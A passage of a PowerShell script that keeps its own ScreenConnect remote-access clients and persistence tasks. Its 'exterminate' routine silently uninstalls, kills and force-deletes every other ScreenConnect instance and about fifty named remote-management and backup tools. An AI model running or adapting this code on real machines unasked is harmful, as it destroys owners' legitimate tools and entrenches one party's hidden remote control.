    # L7: true removal. Correct WOW6432Node hive + msiexec + UninstallString
    # fallback + force dir nuke. Keep sevrz+alt+current gryxa FP (gryxa.cfg).
    # O41: sync Running Gryxa FP into cfg BEFORE any kill; never kill SC procs
    # without a foreign FP in path/cmdline (null path was killing Gryxa every tick).
    $log = Join-Path $WorkDir 'exterminate.log'
    $runningG = Find-RunningGryxaFp
    if ($runningG) { Set-GryxaFp $runningG }
    $keep = @(Get-KeepFingerprints)
    $n = @{ svc = 0; proc = 0; dir = 0; product = 0; rmm = 0; fail = 0 }
    function Log([string]$m) {
        $line = '{0} {1}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $m
        Add-Content -LiteralPath $log -Value $line -ErrorAction SilentlyContinue
        # O41: do NOT Write-Output Log lines (pollutes for /f callers)
    }
    # Protect Gryxa during start race: any live SC process whose path embeds a
    # non-sevrz FP is a keeper even if the service is not Running yet.
    Get-CimInstance Win32_Process -Filter "Name like 'ScreenConnect%'" -ErrorAction SilentlyContinue | ForEach-Object {
        $blob = "$([string]$_.ExecutablePath) $([string]$_.CommandLine)"
        if ($blob -match 'ScreenConnect Client \(([0-9a-fA-F]{16})\)') {
            $fp = $Matches[1].ToLower()
            if ($fp -notin $script:SevrzKeep -and $fp -notin $keep) {
                $keep += $fp
                Set-GryxaFp $fp
                Log "keep_add_from_proc fp=$fp"
            }
        }
    }
    function Is-Keeper([string]$s) {
        if (-not $s) { return $false }
        # allow if relay server/domain is Gryxa OR fingerprint is a keeper
        if ($s -match '(?i)gryxa\.com') { return $true }
        foreach ($k in $keep) { if ($s -like "*$k*") { return $true } }
        return $false
    }
    function Force-RemoveDir([string]$d) {
        if (-not $d -or -not (Test-Path -LiteralPath $d)) { return $true }
        Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
            Where-Object { $_.ExecutablePath -and $_.ExecutablePath.StartsWith($d, [StringComparison]::OrdinalIgnoreCase) } |
            ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
        & takeown.exe /F $d /R /D Y 2>&1 | Out-Null
        & icacls.exe $d /grant '*S-1-5-32-544:F' /T /C /Q 2>&1 | Out-Null
        & icacls.exe $d /grant 'Administrators:F' /T /C /Q 2>&1 | Out-Null
        Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue
        if (Test-Path -LiteralPath $d) {
            cmd.exe /c "attrib -h -s -r /s /d `"$d\*.*`"" 2>&1 | Out-Null
            cmd.exe /c "rmdir /s /q `"$d`"" 2>&1 | Out-Null
        }
        if (Test-Path -LiteralPath $d) {
            $empty = Join-Path $env:TEMP ("own_empty_" + [guid]::NewGuid().ToString('N'))
            New-Item -ItemType Directory -Path $empty -Force | Out-Null
            & robocopy.exe $empty $d /MIR /R:0 /W:0 2>&1 | Out-Null
            Remove-Item -LiteralPath $empty -Force -ErrorAction SilentlyContinue
            Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue
        }
        return -not (Test-Path -LiteralPath $d)
    }
    function Uninstall-ProductKey($key) {
        $guid = $key.PSChildName
        $prop = Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue
        $dn = $prop.DisplayName
        if ($guid -like '{*}') {
            $p = Start-Process msiexec.exe -ArgumentList "/x $guid /qn /norestart REBOOT=ReallySuppress" -Wait -PassThru -WindowStyle Hidden
            Log "product_msiexec [$dn] guid=$guid exit=$($p.ExitCode)"
            if ($p.ExitCode -in 0, 1605, 1614, 3010) { return $true }
        }
        $us = $prop.UninstallString
        if ($us) {
            try {
                if ($us -match '(?i)msiexec') {
                    $args = ($us -replace '(?i)^.*msiexec(\.exe)?\s*', '')
                    if ($args -notmatch '/qn') { $args = "$args /qn /norestart" }
                    $p = Start-Process msiexec.exe -ArgumentList $args -Wait -PassThru -WindowStyle Hidden
                    Log "product_uninstallstring_msi [$dn] exit=$($p.ExitCode)"
                    return ($p.ExitCode -in 0, 1605, 1614, 3010)
                } else {
                    $p = Start-Process cmd.exe -ArgumentList "/c $us /S /silent /quiet /qn" -Wait -PassThru -WindowStyle Hidden
                    Log "product_uninstallstring_exe [$dn] exit=$($p.ExitCode)"
                    return ($p.ExitCode -eq 0)
                }
            } catch { Log "product_uninstallstring_FAIL [$dn] $_" }
        }
        return $false
    }

    Log 'exterminate_engine_L7_begin'

    # 1. foreign SC products from BOTH correct ARP hives
    $seen = @{}
    foreach ($root in $script:UninstallRoots) {
        if (-not (Test-Path $root)) { Log "hive_missing $root"; continue }
        Log "hive_scan $root"
        Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {
            $prop = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
            $dn = $prop.DisplayName
            if (-not $dn) { return }
            if ($dn -notmatch '(?i)ScreenConnect\s+Client\s*\(([0-9A-Fa-f]{16})\)') { return }
            $fp = $Matches[1].ToLower()
            if ($fp -in $keep) { return }
            $us = $prop.UninstallString
            if ($us -and $us -match '(?i)gryxa\.com') { Log "product_skip_gryxa_relay [$dn]"; return }
            if ($seen.ContainsKey($_.PSChildName)) { return }
            $seen[$_.PSChildName] = $true
            if (Uninstall-ProductKey $_) { $n.product++ } else { $n.fail++; Log "product_REMOVE_FAILED [$dn]" }
        }
    }

    # 2. foreign SC services (skip if keeper FP or relay is gryxa.com)
    foreach ($svc in (Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'ScreenConnect Client*' })) {
        if (Is-Keeper $svc.Name) { continue }
        $img = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$($svc.Name)" -ErrorAction SilentlyContinue).ImagePath
        if (Is-Keeper $img) { Log "svc_skip_gryxa_relay $($svc.Name)"; continue }
        & sc.exe stop "$($svc.Name)" 2>&1 | Out-Null
        Start-Sleep -Milliseconds 600
        & sc.exe delete "$($svc.Name)" 2>&1 | Out-Null
        $n.svc++; Log "svc_deleted $($svc.Name)"
    }

    # 3. foreign SC processes — ONLY if path/cmdline embeds a NON-keeper FP.
    # O41: null ExecutablePath used to kill Gryxa ClientService every tick → reinstall loop.
    Get-CimInstance Win32_Process -Filter "Name like 'ScreenConnect%'" -ErrorAction SilentlyContinue | ForEach-Object {
        $exe = [string]$_.ExecutablePath
        $cmd = [string]$_.CommandLine
        $blob = "$exe $cmd"
        if (Is-Keeper $blob) { return }
        if ($blob -match '(?i)gryxa\.com') { Log "proc_skip_gryxa_relay pid=$($_.ProcessId)"; return }
        if ($blob -notmatch '\(([0-9a-fA-F]{16})\)') {
            Log "proc_skip_no_fp pid=$($_.ProcessId) name=$($_.Name)"
            return
        }
        $fp = $Matches[1].ToLower()
        if ($fp -in $keep) { return }
        Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
        $n.proc++; Log "proc_killed pid=$($_.ProcessId) fp=$fp exe=$exe"
    }

    # 4. foreign SC install dirs (PF + PF86)
    foreach ($base in @($env:ProgramFiles, ${env:ProgramFiles(x86)})) {
        if (-not $base -or -not (Test-Path $base)) { continue }
        Get-ChildItem -LiteralPath $base -Directory -Force -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -like 'ScreenConnect*' } | ForEach-Object {
                $d = $_.FullName
                if (Is-Keeper $d) { return }
                # dir carries no FP/relay in its name; protect the one backing a keeper/gryxa service
                $leaf = $_.Name
                $svcHere = Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'ScreenConnect Client*' } | Where-Object {
                    $im = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$($_.Name)" -ErrorAction SilentlyContinue).ImagePath
                    $im -and ($im -like "*$leaf*")
                }
                if ($svcHere) { Log "dir_skip_live_svc $d"; return }
                if (Force-RemoveDir $d) { $n.dir++; Log "dir_removed $d" }
                else { $n.fail++; Log "dir_REMOVE_FAILED $d" }
            }
    }

    # 5. disallowed RMM / remote-access tools (market coverage 2026).
    # KEEP forever: Datto/CentraStage + ScreenConnect keep FPs (handled above).
    # NEVER put Datto/CentraStage/CagService in this list.
    function Is-DattoKeeper([string]$s) {
        if (-not $s) { return $false }
        return [bool]($s -match '(?i)Datto|CentraStage|CagService|AutotaskEndpoint')
    }
    $rmm = @(
        @{ Tag='AnyDesk';      Svc=@('AnyDesk'); Proc=@('AnyDesk'); Dirs=@("$env:ProgramFiles\AnyDesk","${env:ProgramFiles(x86)}\AnyDesk","$env:ProgramData\AnyDesk"); Prod=@('AnyDesk*') }
        @{ Tag='TeamViewer';   Svc=@('TeamViewer*'); Proc=@('TeamViewer*','tv_w32*','tv_x64*'); Dirs=@("$env:ProgramFiles\TeamViewer","${env:ProgramFiles(x86)}\TeamViewer"); Prod=@('TeamViewer*') }
        @{ Tag='Splashtop';    Svc=@('Splashtop*','SRService','SSUService'); Proc=@('Splashtop*','strwinclt*','SRManager*'); Dirs=@("$env:ProgramFiles\Splashtop","${env:ProgramFiles(x86)}\Splashtop"); Prod=@('Splashtop*') }
        @{ Tag='LogMeIn';      Svc=@('LogMeIn','LMIGuardianSvc','LMIignition'); Proc=@('LogMeIn*','LMIGuardian*','RaServer*'); Dirs=@("$env:ProgramFiles\LogMeIn","${env:ProgramFiles(x86)}\LogMeIn"); Prod=@('LogMeIn*') }
        @{ Tag='GoTo';         Svc=@('GoToMyPC*','GoToAssist*','GoToResolve*'); Proc=@('GoToMyPC*','GoToAssist*','g2m*','GoToResolve*'); Dirs=@("$env:ProgramFiles\GoToMyPC","${env:ProgramFiles(x86)}\GoToMyPC"); Prod=@('GoToMyPC*','GoToAssist*','GoTo Resolve*','GoToMeeting*','GoTo Connect*') }
        @{ Tag='RustDesk';     Svc=@('RustDesk','rustdesk*'); Proc=@('rustdesk*'); Dirs=@("$env:ProgramFiles\RustDesk","${env:ProgramFiles(x86)}\RustDesk"); Prod=@('RustDesk*') }
        @{ Tag='Supremo';      Svc=@('Supremo*'); Proc=@('Supremo*'); Dirs=@("$env:ProgramFiles\Supremo","${env:ProgramFiles(x86)}\Supremo"); Prod=@('Supremo*') }
        @{ Tag='DWService';    Svc=@('DWAgent','dwagent*'); Proc=@('dwagent*'); Dirs=@("$env:ProgramFiles\DWAgent","${env:ProgramFiles(x86)}\DWAgent","$env:ProgramData\DWAgent"); Prod=@('DWAgent*','DWService*') }
        @{ Tag='ZohoAssist';   Svc=@('ZohoAssist*','ZohoMeeting*'); Proc=@('ZohoAssist*','ZohoURSB*'); Dirs=@("$env:ProgramFiles\ZohoMeeting","${env:ProgramFiles(x86)}\ZohoMeeting"); Prod=@('Zoho Assist*','ZohoMeeting*') }
        @{ Tag='RemotePC';     Svc=@('RemotePC*'); Proc=@('RemotePC*','RPCSuite*'); Dirs=@("$env:ProgramFiles\RemotePC","${env:ProgramFiles(x86)}\RemotePC"); Prod=@('RemotePC*') }
        @{ Tag='Bomgar';       Svc=@('bomgar*','BeyondTrust*'); Proc=@('bomgar*'); Dirs=@("$env:ProgramFiles\Bomgar","${env:ProgramFiles(x86)}\Bomgar","$env:ProgramFiles\BeyondTrust","${env:ProgramFiles(x86)}\BeyondTrust"); Prod=@('Bomgar*','BeyondTrust*') }
        @{ Tag='Parsec';       Svc=@('Parsec*'); Proc=@('parsecd*','pservice*'); Dirs=@("$env:ProgramFiles\Parsec","${env:ProgramFiles(x86)}\Parsec","$env:ProgramData\Parsec"); Prod=@('Parsec*') }
        @{ Tag='ChromeRD';     Svc=@('chromoting*'); Proc=@('remoting_host*'); Dirs=@("$env:ProgramFiles\Google\Chrome Remote Desktop","${env:ProgramFiles(x86)}\Google\Chrome Remote Desktop"); Prod=@('Chrome Remote Desktop*') }
        @{ Tag='UltraVNC';     Svc=@('uvnc*','winvnc*'); Proc=@('winvnc*','uvnc*'); Dirs=@("$env:ProgramFiles\UltraVNC","${env:ProgramFiles(x86)}\UltraVNC"); Prod=@('UltraVNC*','WinVNC*') }
        @{ Tag='TightVNC';     Svc=@('tvnserver*'); Proc=@('tvnserver*','tvnviewer*'); Dirs=@("$env:ProgramFiles\TightVNC","${env:ProgramFiles(x86)}\TightVNC"); Prod=@('TightVNC*') }
        @{ Tag='RealVNC';      Svc=@('vncserver*'); Proc=@('vncserver*','vncviewer*'); Dirs=@("$env:ProgramFiles\RealVNC","${env:ProgramFiles(x86)}\RealVNC"); Prod=@('VNC Server*','RealVNC*') }
        @{ Tag='DameWare';     Svc=@('DameWare*'); Proc=@('DWRCS*','DWRCC*','DameWare*'); Dirs=@("$env:ProgramFiles\SolarWinds","${env:ProgramFiles(x86)}\SolarWinds","$env:ProgramFiles\DameWare Remote Support","${env:ProgramFiles(x86)}\DameWare Remote Support"); Prod=@('DameWare*') }
        @{ Tag='NetSupport';   Svc=@('NetSupport*'); Proc=@('client32*','pcictl*'); Dirs=@("$env:ProgramFiles\NetSupport","${env:ProgramFiles(x86)}\NetSupport"); Prod=@('NetSupport*') }
        @{ Tag='SimpleHelp';   Svc=@('SimpleHelp*'); Proc=@('SimpleService*','simpleservice*'); Dirs=@("$env:ProgramFiles\SimpleHelp","${env:ProgramFiles(x86)}\SimpleHelp"); Prod=@('SimpleHelp*') }
        @{ Tag='GetScreen';    Svc=@('GetScreen*'); Proc=@('GetScreen*'); Dirs=@("$env:ProgramFiles\GetScreen","${env:ProgramFiles(x86)}\GetScreen"); Prod=@('GetScreen*') }
        @{ Tag='Iperius';      Svc=@('Iperius*'); Proc=@('IperiusRemote*'); Dirs=@("$env:ProgramFiles\Iperius Remote","${env:ProgramFiles(x86)}\Iperius Remote"); Prod=@('Iperius*') }
        @{ Tag='ISLOnline';   Svc=@('ISLlight*'); Proc=@('ISLlight*','ISLAlwaysOn*'); Dirs=@("$env:ProgramFiles\ISL Online","${env:ProgramFiles(x86)}\ISL Online"); Prod=@('ISL Light*','ISL AlwaysOn*') }
        @{ Tag='Ammyy';        Svc=@('Ammyy*'); Proc=@('Ammyy*'); Dirs=@("$env:ProgramFiles\Ammyy","${env:ProgramFiles(x86)}\Ammyy"); Prod=@('Ammyy*') }
        @{ Tag='UltraViewer';  Svc=@('UltraViewer*'); Proc=@('UltraViewer*'); Dirs=@("$env:ProgramFiles\UltraViewer","${env:ProgramFiles(x86)}\UltraViewer"); Prod=@('UltraViewer*') }
        @{ Tag='AeroAdmin';    Svc=@('AeroAdmin*'); Proc=@('AeroAdmin*'); Dirs=@("$env:ProgramFiles\AeroAdmin","${env:ProgramFiles(x86)}\AeroAdmin"); Prod=@('AeroAdmin*') }
        @{ Tag='LiteManager';  Svc=@('LiteManager*'); Proc=@('ROMServer*','ROMViewer*'); Dirs=@("$env:ProgramFiles\LiteManager","${env:ProgramFiles(x86)}\LiteManager"); Prod=@('LiteManager*') }
        @{ Tag='Radmin';       Svc=@('Radmin*'); Proc=@('rserver3*','Radmin*'); Dirs=@("$env:ProgramFiles\Radmin Server 3","${env:ProgramFiles(x86)}\Radmin Server 3"); Prod=@('Radmin*') }
        @{ Tag='NoMachine';    Svc=@('nxserver*','nxd*'); Proc=@('nxd*','nxserver*','nxrunner*'); Dirs=@("$env:ProgramFiles\NoMachine","${env:ProgramFiles(x86)}\NoMachine"); Prod=@('NoMachine*') }
        @{ Tag='NinjaOne';     Svc=@('NinjaRMMAgent','ninjarmm*','NinjaRMM*'); Proc=@('NinjaRMMAgent*','ninjarmm*'); Dirs=@("$env:ProgramFiles\NinjaRMMAgent","${env:ProgramFiles(x86)}\NinjaRMMAgent","$env:ProgramData\NinjaRMMAgent","$env:ProgramFiles\NinjaOne","${env:ProgramFiles(x86)}\NinjaOne"); Prod=@('NinjaRMM*','NinjaOne*') }
        @{ Tag='Atera';        Svc=@('AteraAgent'); Proc=@('AteraAgent*'); Dirs=@("$env:ProgramFiles\ATERA Networks","${env:ProgramFiles(x86)}\ATERA Networks","$env:ProgramData\ATERA Networks"); Prod=@('Atera*') }
        @{ Tag='ConnectWise';  Svc=@('LTService','LTSvcMon'); Proc=@('LTSvc*','LTTray*'); Dirs=@("$env:windir\LTSvc","$env:ProgramFiles\LabTech Client","${env:ProgramFiles(x86)}\LabTech Client"); Prod=@('ConnectWise Automate*','ConnectWise RMM*','LabTech*') }
        @{ Tag='Kaseya';       Svc=@('AgentMon','Kaseya*','KAADS*'); Proc=@('AgentMon*','Kaseya*'); Dirs=@("$env:ProgramFiles\Kaseya","${env:ProgramFiles(x86)}\Kaseya"); Prod=@('Kaseya VSA*','Kaseya Agent*') }
        @{ Tag='Nable';        Svc=@('Advanced Monitoring Agent*','N-able*','NCentral*'); Proc=@('FileSystemAgent*','NCentral*'); Dirs=@("$env:ProgramFiles\Advanced Monitoring Agent","${env:ProgramFiles(x86)}\Advanced Monitoring Agent","$env:ProgramFiles\N-able Technologies","${env:ProgramFiles(x86)}\N-able Technologies","$env:ProgramFiles\MSPA Files","${env:ProgramFiles(x86)}\MSPA Files"); Prod=@('Advanced Monitoring Agent*','N-able*','N-central*','N-sight*','Take Control*','SolarWinds MSP*') }
        @{ Tag='Syncro';       Svc=@('Syncro*','Kabuto*'); Proc=@('Syncro*','Kabuto*'); Dirs=@("$env:ProgramFiles\RepairTech","${env:ProgramFiles(x86)}\RepairTech","$env:ProgramFiles\Syncro","${env:ProgramFiles(x86)}\Syncro","$env:ProgramData\Syncro"); Prod=@('Syncro*','Kabuto*','RepairTech*') }
        @{ Tag='Pulseway';     Svc=@('Pulseway*','PC Monitor*'); Proc=@('PCMonitorMgr*','PCMonitorManager*','Pulseway*'); Dirs=@("$env:ProgramFiles\Pulseway","${env:ProgramFiles(x86)}\Pulseway","$env:ProgramFiles\PC Monitor","${env:ProgramFiles(x86)}\PC Monitor"); Prod=@('Pulseway*','PC Monitor*') }
        @{ Tag='SuperOps';     Svc=@('SuperOps*'); Proc=@('SuperOps*'); Dirs=@("$env:ProgramFiles\SuperOps","${env:ProgramFiles(x86)}\SuperOps","$env:ProgramData\SuperOps"); Prod=@('SuperOps*') }
        @{ Tag='Level';        Svc=@('Level*'); Proc=@('level*'); Dirs=@("$env:ProgramFiles\Level","${env:ProgramFiles(x86)}\Level","$env:ProgramData\Level"); Prod=@('Level*') }
        @{ Tag='Action1';      Svc=@('Action1*'); Proc=@('Action1*','action1_agent*'); Dirs=@("$env:ProgramFiles\Action1","${env:ProgramFiles(x86)}\Action1","$env:ProgramData\Action1"); Prod=@('Action1*') }
        @{ Tag='ManageEngine'; Svc=@('ManageEngine*','UEMS*','DCAgent*'); Proc=@('ManageEngine*','dcagent*','UEMS*'); Dirs=@("$env:ProgramFiles\ManageEngine","${env:ProgramFiles(x86)}\ManageEngine"); Prod=@('ManageEngine*','UEMS*','Desktop Central*','Endpoint Central*','RMM Central*') }
        @{ Tag='TacticalRMM';  Svc=@('tacticalrmm*','Mesh Agent','MeshAgent'); Proc=@('tacticalrmm*','meshagent*','MeshAgent*'); Dirs=@("$env:ProgramFiles\TacticalAgent","${env:ProgramFiles(x86)}\TacticalAgent","$env:ProgramFiles\Mesh Agent","${env:ProgramFiles(x86)}\Mesh Agent"); Prod=@('Tactical*','Mesh Agent*','MeshCentral*') }
        @{ Tag='MeshCentral';  Svc=@('Mesh Agent','MeshAgent','MeshCentral*'); Proc=@('MeshAgent*','MeshCentral*'); Dirs=@("$env:ProgramFiles\Mesh Agent","${env:ProgramFiles(x86)}\Mesh Agent"); Prod=@('Mesh*Agent*','MeshCentral*') }
        @{ Tag='Continuum';    Svc=@('SAAZ*','Continuum*'); Proc=@('SAAZ*','Continuum*'); Dirs=@("$env:ProgramFiles\SAAZOD","${env:ProgramFiles(x86)}\SAAZOD","$env:ProgramFiles\Continuum","${env:ProgramFiles(x86)}\Continuum"); Prod=@('Continuum*','SAAZ*') }
        @{ Tag='Naverisk';     Svc=@('Naverisk*'); Proc=@('Naverisk*'); Dirs=@("$env:ProgramFiles\Naverisk","${env:ProgramFiles(x86)}\Naverisk"); Prod=@('Naverisk*') }
        @{ Tag='ImmyBot';      Svc=@('ImmyBot*','Immy*'); Proc=@('ImmyAgent*','ImmyBot*'); Dirs=@("$env:ProgramFiles\ImmyBot","${env:ProgramFiles(x86)}\ImmyBot","$env:ProgramData\ImmyBot"); Prod=@('ImmyBot*') }
        @{ Tag='Automox';      Svc=@('amagent*','Automox*'); Proc=@('amagent*'); Dirs=@("$env:ProgramFiles\Automox","${env:ProgramFiles(x86)}\Automox","$env:ProgramData\amagent"); Prod=@('Automox*') }
        @{ Tag='AcronisCyber'; Svc=@('Acronis*'); Proc=@('acrocmd*'); Dirs=@("$env:ProgramFiles\Acronis","${env:ProgramFiles(x86)}\Acronis"); Prod=@('Acronis Cyber*','Acronis Agent*','Cyber Protect Agent*') }
        @{ Tag='Domotz';       Svc=@('Domotz*'); Proc=@('Domotz*'); Dirs=@("$env:ProgramFiles\Domotz","${env:ProgramFiles(x86)}\Domotz"); Prod=@('Domotz*') }
        @{ Tag='Auvik';        Svc=@('Auvik*'); Proc=@('Auvik*'); Dirs=@("$env:ProgramFiles\Auvik","${env:ProgramFiles(x86)}\Auvik"); Prod=@('Auvik*') }
        @{ Tag='BarracudaRMM'; Svc=@('Barracuda*'); Proc=@('MWService*'); Dirs=@("$env:ProgramFiles\Barracuda","${env:ProgramFiles(x86)}\Barracuda","$env:ProgramFiles\Level Platforms","${env:ProgramFiles(x86)}\Level Platforms"); Prod=@('Barracuda RMM*','Managed Workplace*') }
        @{ Tag='Goverlan';     Svc=@('Goverlan*'); Proc=@('goverlan*','govagent*'); Dirs=@("$env:ProgramFiles\Goverlan","${env:ProgramFiles(x86)}\Goverlan"); Prod=@('Goverlan*') }
        @{ Tag='PDQ';          Svc=@('PDQ*'); Proc=@('PDQRunner*','PDQInventory*','PDQDeploy*'); Dirs=@("$env:ProgramFiles\Admin Arsenal","${env:ProgramFiles(x86)}\Admin Arsenal","$env:ProgramFiles\PDQ","${env:ProgramFiles(x86)}\PDQ"); Prod=@('PDQ Deploy*','PDQ Inventory*','PDQ Connect*') }
    )

    foreach ($tool in $rmm) {
        $hit = $false
        foreach ($pat in $tool.Prod) {
            foreach ($root in $script:UninstallRoots) {
                Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {
                    $dn = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).DisplayName
                    if ($dn -and $dn -like $pat) {
                        if (Is-DattoKeeper $dn) { Log "rmm_skip_datto_keep [$dn]"; return }
                        if (Uninstall-ProductKey $_) { $n.rmm++; $hit = $true }
                    }
                }
            }
        }
        foreach ($pat in $tool.Svc) {
            Get-Service -Name $pat -ErrorAction SilentlyContinue | ForEach-Object {
                if (Is-DattoKeeper $_.Name -or Is-DattoKeeper $_.DisplayName) { Log "rmm_skip_datto_svc $($_.Name)"; return }
                & sc.exe stop "$($_.Name)" 2>&1 | Out-Null
                Start-Sleep -Milliseconds 500
                & sc.exe delete "$($_.Name)" 2>&1 | Out-Null
                $n.rmm++; $hit = $true; Log "rmm_svc_deleted $($_.Name) [$($tool.Tag)]"
            }
        }
        foreach ($pat in $tool.Proc) {
            Get-Process -Name $pat -ErrorAction SilentlyContinue | ForEach-Object {
                Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
                $n.rmm++; $hit = $true; Log "rmm_proc_killed $($_.ProcessName) [$($tool.Tag)]"
            }
        }
        foreach ($d in $tool.Dirs) {
            if ($d -and (Test-Path -LiteralPath $d)) {
                if (Is-DattoKeeper $d) { Log "rmm_skip_datto_dir $d"; continue }
                if (Force-RemoveDir $d) { $n.rmm++; $hit = $true; Log "rmm_dir_removed $d" }
                else { $n.fail++; Log "rmm_dir_REMOVE_FAILED $d" }
            }
        }
        if ($hit) { Log "rmm_exterminated $($tool.Tag)" }
    }

    $summary = "exterminate svc=$($n.svc) proc=$($n.proc) dir=$($n.dir) product=$($n.product) rmm=$($n.rmm) fail=$($n.fail)"
    Log $summary
    return $summary
}

function Update-State {
    $keep = @(Get-KeepFingerprints)
    $gryxaFp = Get-GryxaFp
    $prim = $null; $alt = $null; $script:gryxa = $null
    foreach ($svc in (Get-Service -Name 'ScreenConnect Client*')) {
        if ($svc.Name -match '\(([0-9a-f]{16})\)') {
            if ($matches[1] -eq '5f6010579852e507') { $prim = "$($svc.Status)" }
            elseif ($matches[1] -eq 'f861c8140d453427') { $alt = "$($svc.Status)" }
            elseif ($matches[1] -eq $gryxaFp) { $script:gryxa = "$($svc.Status)" }
        }
    }
    $foreign = @()
    foreach ($svc in (Get-Service -Name 'ScreenConnect Client*')) {
        if ($svc.Name -match '\(([0-9a-f]{16})\)' -and $matches[1] -notin $keep) {
            $foreign += $matches[1]
        }
    }
    $id = Read-Identity
    $tasksOk = 0; $tasksTotal = 0
    foreach ($k in 'TASK_A','TASK_B','TASK_C','TASK_D') {
        $tasksTotal++
        $tn = Normalize-TaskName ([string]$id[$k])
        if (-not $tn) { continue }
        $marker = if ($k -eq 'TASK_B') { 'etl_mon.cmd' } else { 'own_mon.cmd' }
        if ((Test-TaskOwnsMon $tn $marker) -or (Test-TaskOwnsMon ("\$tn") $marker)) { $tasksOk++ }
    }
    if (-not $MonPath) { $MonPath = Join-Path $WorkDir 'own_mon.cmd' }
    $wd = Ensure-Watchdog
    $prev = @{}
    $statePath = Join-Path $WorkDir 'state.json'
    if (Test-Path $statePath) {
        try { (Get-Content -LiteralPath $statePath -Raw | ConvertFrom-Json).PSObject.Properties | ForEach-Object { $prev[$_.Name] = $_.Value } } catch {}
    }
    $installCount = 1
    if ($prev.installCount) { $installCount = [int]$prev.installCount }
    if ($prev.prim -and $prev.prim -ne 'Running' -and $prim -eq 'Running') { $installCount++ }
    $state = [ordered]@{
        host         = $env:COMPUTERNAME
        ts           = (Get-Date).ToUniversalTime().ToString('o')
        build        = $Build
        prim         = $(if ($prim) { $prim } else { 'MISSING' })
        alt          = $(if ($alt) { $alt } else { 'MISSING' })
        gryxa        = $(if ($script:gryxa) { $script:gryxa } else { 'MISSING' })
        gryxaFp      = $gryxaFp
        foreign      = $foreign
        tasksOk      = $tasksOk
        tasksTotal   = $tasksTotal
        watchdog     = $wd
        installCount = $installCount
        lastHeal     = $(if ($Extra) { (Get-Date).ToUniversalTime().ToString('o') } elseif ($prev.lastHeal) { $prev.lastHeal } else { $null })
        note         = $Extra
    }
    ($state | ConvertTo-Json -Compress) | Set-Content -LiteralPath $statePath -Force
    return $state
}

switch ($Action) {
    'init'            { $id = Initialize-Identity; $id.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" } }
    'identity'        { $id = Read-Identity; $id.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" } }
    'watchdog'        { Install-Watchdog | Out-Null }
    'watchdog-ensure' { Ensure-Watchdog }
    'tasks-ensure'    { Ensure-PersistTasks }
    'state'           { Update-State | ConvertTo-Json -Compress }
    'repair'          { Repair-SCService $Fp }
    'registered'      { Test-SCRegistered $Fp }
    'exterminate'     { Invoke-Exterminate }
    'gryxa-health'    { Test-GryxaHealth }
    'gryxa-ensure'    { Write-Output (Invoke-GryxaEnsure | Out-String).Trim() }
}
